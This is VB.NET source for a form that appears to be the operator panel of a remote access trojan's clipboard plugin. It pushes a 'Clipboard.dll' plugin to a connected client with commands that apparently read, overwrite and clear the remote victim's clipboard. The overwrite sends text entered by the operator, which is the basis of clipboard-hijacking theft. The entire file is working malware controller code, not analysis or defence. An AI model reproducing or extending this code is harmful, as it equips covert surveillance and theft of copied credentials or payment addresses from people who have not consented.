Imports System.IO

Public Class CB
    Public C As Client
    Private Sub CB_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim B As Byte() = SB("R$" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipboard.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub REToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles REToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("R$" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipboard.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub KillProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("SETT" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipboard.dll")) & Settings.SPL & RichTextBox1.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("clss" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Clipboard.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            RichTextBox1.Clear()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            Clipboard.SetText(RichTextBox1.SelectedText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RichTextBox1_LinkClicked(sender As Object, e As LinkClickedEventArgs) Handles RichTextBox1.LinkClicked
        Try
            Process.Start(e.LinkText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class